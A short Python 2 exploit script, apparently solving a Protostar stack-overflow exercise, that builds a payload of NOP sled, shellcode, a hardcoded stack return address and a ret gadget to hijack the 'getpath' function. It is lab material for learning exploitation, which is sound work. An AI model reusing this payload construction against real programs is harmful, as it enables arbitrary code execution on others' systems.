#!/usr/bin/python

f = open('/opt/protostar/bin/BOOM2.bin','r')
sc = f.read()
f.close()
#0x08048544

bufLen = 64

#0x08048550 # ret getpath
#0xbffffc5c # buf address

bufAddr = '\x5c\xfc\xff\xbf'
# return to the buffer again + 16 to get to the sc
buf2    = '\x64\xfc\xff\xbf'

#pad = 'R'*4 + buf2 + sc # 51-16
#padLen = len(pad)
#print pad +'A'.ljust(bufLen-padLen, '\x90')  +'BBBBCCCCDDDD'+ bufAddr + '\x50\x85\x04\x08' + 'HHHHIIIIJJJJKKKK' + 'FFFFGGGG'


#######pad = 'R'*4 + buf2 +'\xcc'*68 #sigtrap
#pad = 'R'*4 + buf2 + '\x90'*18+'\xcc'*50
#pad = 'R'*4 + buf2 + '\x90'*18 + sc.ljust(50,'\xcc')+ 'A'*13


pad = 'R'*4 + buf2 +'\x90'*8 + sc.ljust(60,'\xcc')

print pad  + bufAddr + '\x50\x85\x04\x08' + 'HHHHIIIIJJJJKKKK'+'FFFFGGGG'
